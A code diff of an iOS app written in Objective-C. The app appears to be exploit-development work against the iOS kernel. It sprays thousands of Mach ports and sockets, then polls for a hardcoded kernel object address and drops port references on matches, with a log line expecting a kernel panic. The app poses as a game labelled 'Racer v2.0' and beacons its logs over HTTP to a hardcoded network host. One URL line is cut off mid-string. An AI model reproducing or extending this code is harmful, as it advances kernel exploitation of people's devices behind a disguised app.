@@ -1,3 +1,5 @@
+
+
 #import <UIKit/UIKit.h>
 #import <WebKit/WebKit.h>
 #include <mach/mach.h>
@@ -12,18 +14,22 @@
 #include <stdio.h>
 #include <stdarg.h>
 #include <unistd.h>
+#include <stdbool.h>
 
 #define NUM_PORTS        20000
 #define NUM_SOCKETS      200
-#define DATA_TARGET      0x0000000FFFFFC330ULL
+#define DATA_TARGET  0x0000000FFFFFC330ULL
 #define REPORT_HOST      "192.168.68.109"
 #define PROBE_INTERVAL_S 5
+#define KTYPE_A   2
+#define KTYPE_B       27
 
 static mach_port_t g_ports[NUM_PORTS];
 static int         g_port_count = 0;
 static int         g_socks[NUM_SOCKETS];
 static int         g_sock_count = 0;
 static _Atomic int g_found = 0;
+static bool        g_consumed[NUM_PORTS];   
 static WKWebView  *g_webView = nil;
 
 static void http_report(const char *msg) {
@@ -35,8 +41,8 @@ static void http_report(const char *msg) {
     raw = [raw stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
     NSString *script = [NSString stringWithFormat:
         @"var x=new XMLHttpRequest();"
-        "x.open('POST','http://%s:9999/',true);"
-        "x.send('[v17p] %@');",
+        "x.open('POST','http:
+        "x.send('[v18p] %@');",
         REPORT_HOST, raw];
     dispatch_async(dispatch_get_main_queue(), ^{
         [wv evaluateJavaScript:script completionHandler:nil];
@@ -46,7 +52,7 @@ static void http_report(const char *msg) {
 static void ev(const char *fmt, ...) {
     char buf[512]; va_list ap;
     va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
-    NSLog(@"[v17p] %{public}s", buf);
+    NSLog(@"[v18p] %{public}s", buf);
     http_report(buf);
 }
 
@@ -67,71 +73,85 @@ static void spray(void) {
         }
         g_ports[g_port_count++] = p;
     }
+    memset(g_consumed, 0, sizeof(g_consumed));
     ev("SPRAY socks=%d ports=%d target=0x%016llx",
        g_sock_count, g_port_count, (unsigned long long)DATA_TARGET);
 }
 
-static void *probe_loop(void *arg) {
+static void *data_loop(void *arg) {
     struct task_basic_info info;
     mach_msg_type_number_t count;
     mach_port_t self = mach_task_self();
     int cycle = 0;
 
     for (;;) {
-        int task_ports = 0, probed = 0;
+        int task_kotype = 0, probed = 0;
         for (int i = 0; i < g_port_count; i++) {
             if (g_ports[i] == MACH_PORT_NULL) continue;
+            if (g_consumed[i]) continue;            
             natural_t kotype = 0;
             mach_vm_address_t kobject = 0;
             if (mach_port_kobject(self, g_ports[i], &kotype, &kobject) != KERN_SUCCESS)
                 continue;
-            if (kotype != 2 && kobject != DATA_TARGET) continue;
-            task_ports++;
-            ev("TASK_KOTYPE port=%d kotype=%u kobject=0x%016llx",
-               i, kotype, (unsigned long long)kobject);
-            count = TASK_BASIC_INFO_COUNT;
-            kern_return_t kr = task_info((task_t)g_ports[i], TASK_BASIC_INFO,
-                                         (task_info_t)&info, &count);
-            probed++;
-            ev("TASK_INFO_RETURNED port=%d kr=%d", i, (int)kr);
+            if (kobject != DATA_TARGET) continue;
+
+            task_kotype++;
+            if (kotype == KTYPE_A || kotype == 0) {
+                
+                ev("HIT_A port=%d kotype=%u kobject=0x%016llx ג€” task_info",
+                   i, kotype, (unsigned long long)kobject);
+                count = TASK_BASIC_INFO_COUNT;
+                kern_return_t kr = task_info((task_t)g_ports[i], TASK_BASIC_INFO,
+                                             (task_info_t)&info, &count);
+                probed++;
+                ev("HIT_A_RET port=%d kr=%d", i, (int)kr);
+            } else if (kotype == KTYPE_B) {
+                
+                g_consumed[i] = true;               
+                ev("HIT_B port=%d kotype=%u kobject=0x%016llx ג€” mod_refs(-1,RECEIVE)",
+                   i, kotype, (unsigned long long)kobject);
+                kern_return_t kr = mach_port_mod_refs(self, g_ports[i],
+                                                      MACH_PORT_RIGHT_RECEIVE, -1);
+                probed++;
+                ev("HIT_B_RET port=%d kr=%d (panic expected before this)",
+                   i, (int)kr);
+                g_ports[i] = MACH_PORT_NULL;        
+            }
         }
         cycle++;
         ev("PROBE_CYCLE cycle=%d ports=%d task_kotype=%d probed=%d",
-           cycle, g_port_count, task_ports, probed);
+           cycle, g_port_count, task_kotype, probed);
         sleep(PROBE_INTERVAL_S);
     }
     return NULL;
 }
 
-static void scan_background(void) {
+static void scan_bg(void) {
     if (g_found) return;
+    mach_port_t self = mach_task_self();
     for (int i = 0; i < g_port_count; i++) {
         if (g_found) break;
+        if (g_ports[i] == MACH_PORT_NULL || g_consumed[i]) continue;
         natural_t kotype = 0; mach_vm_address_t kobject = 0;
-        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
-        if (kr != KERN_SUCCESS) continue;
+        if (mach_port_kobject(self, g_ports[i], &kotype, &kobject) != KERN_SUCCESS) continue;
         if (kotype == (natural_t)0xFFFFFFFF && kobject == 0) continue;
 
         if (kobject == DATA_TARGET) {
             g_found = 1;
-            ev("HIT port=%d kotype=%u kobject=0x%016llx calling_task_info",
-               i, kotype, (unsigned long long)kobject);
-            struct task_basic_info inf; mach_msg_type_number_t cnt = TASK_BASIC_INFO_COUNT;
-            task_info((task_t)g_ports[i], TASK_BASIC_INFO, (task_info_t)&inf, &cnt);
-        } else if (kotype != 0 || kobject != 0) {
-            ev("PORT_CHANGED port=%d kotype=%u kobject=0x%016llx",
-               i, kotype, (unsigned long long)kobject);
-        }
-    }
-    for (int i = 0; i < g_sock_count; i++) {
-        if (g_found) break;
-        unsigned char out[32]; socklen_t flen = 32;
-        if (getsockopt(g_socks[i], 58, 18, out, &flen) < 0) continue;
-        for (int j = 0; j < 32; j++) {
-            if (out[j] != 0xFF) {
-                ev("SOCK_CHANGE sock=%d byte[%d]=0x%02X", i, j, out[j]);
-                break;
+            if (kotype == KTYPE_B) {
+                g_consumed[i] = true;
+                ev("FOUND_B port=%d kotype=27 kobject=0x%016llx ג€” mod_refs(-1)",
+                   i, (unsigned long long)kobject);
+                mach_port_mod_refs(self, g_ports[i], MACH_PORT_RIGHT_RECEIVE, -1);
+                g_ports[i] = MACH_PORT_NULL;
+            } else {
+                ev("FOUND_A port=%d kotype=%u kobject=0x%016llx ג€” task_info",
+                   i, kotype, (unsigned long long)kobject);
+                struct task_basic_info inf; mach_msg_type_number_t cnt = TASK_BASIC_INFO_COUNT;
+                task_info((task_t)g_ports[i], TASK_BASIC_INFO, (task_info_t)&inf, &cnt);
             }
+        } else if (kotype != 0 || kobject != 0) {
+            ev("PORT_CHG port=%d kotype=%u kobject=0x%016llx", i, kotype, (unsigned long long)kobject);
         }
     }
 }
@@ -153,9 +173,9 @@ static void scan_background(void) {
     UIViewController *vc = [[UIViewController alloc] init];
     vc.view.backgroundColor = [UIColor blackColor];
     UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20, 80, 340, 60)];
-    lbl.text = @"GamePhysics";
+    lbl.text = @"Racer v2.0";
     lbl.textColor = [UIColor greenColor];
-    lbl.font = [UIFont fontWithName:@"Menlo" size:14];
+    lbl.font = [UIFont fontWithName:@"Menlo" size:13];
     [vc.view addSubview:lbl];
     self.window.rootViewController = vc;
     [self.window makeKeyAndVisible];
@@ -171,10 +191,11 @@ static void scan_background(void) {
     spray();
 
     pthread_t probe_thread;
-    pthread_create(&probe_thread, NULL, probe_loop, NULL);
+    pthread_create(&probe_thread, NULL, data_loop, NULL);
     pthread_detach(probe_thread);
 
-    ev("LAUNCH N=%d probe-interval=%ds", g_port_count, PROBE_INTERVAL_S);
+    ev("LAUNCH N=%d interval=%ds TASK+TIMER dual-trigger",
+       g_port_count, PROBE_INTERVAL_S);
 
     self.scanTimer = [NSTimer scheduledTimerWithTimeInterval:0.10
                                                       target:self
@@ -186,7 +207,7 @@ static void scan_background(void) {
 - (void)scanTick:(NSTimer *)t {
     static int tick = 0; tick++;
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        scan_background();
+        scan_bg();
     });
     if (tick % 100 == 0)
         ev("ALIVE tick=%d found=%d ports=%d", tick, g_found, g_port_count);
